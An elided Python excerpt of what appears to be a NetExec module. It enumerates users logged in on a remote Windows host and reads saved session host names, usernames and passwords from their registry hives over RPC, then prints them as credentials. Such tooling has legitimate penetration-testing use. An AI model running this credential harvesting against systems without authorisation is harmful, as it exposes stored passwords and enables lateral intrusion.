...
class NXCModule:
    ...
    def registry_session_extractor(self, context, connection, user_object, sessionName):
        ...
        try:
            ...
            host_name = unquote(
                rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "HostName")[1].split("\x00")[:-1][
                    0
                ]
            )
            user_name = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "UserName")[1].split(
                "\x00"
            )[:-1][0]
            try:
                password = rrp.hBaseRegQueryValue(remote_ops._RemoteOperations__rrp, key_handle, "Password")[1].split(
                    "\x00"
                )[:-1][0]
            except Exception:
    ...
    def find_all_logged_in_users_in_registry(self, context, connection):
        ...
        try:
            ...
            # Get User Names
            user_names = [
                rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0]
        ...
        try:
            ...
            for user_object in all_user_objects:
                try:
                    ...
                    # Get Session Names
                    session_names = [
                        rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split(
                            "\x00"
                        )[:-1][0]
                    ...
                    for sessionName in session_names:
                        self.print_creds(
                            context,
                            self.registry_session_extractor(context, connection, user_object, sessionName),
                        )
                except DCERPCException as e:
                    if str(e).find("ERROR_FILE_NOT_FOUND"):
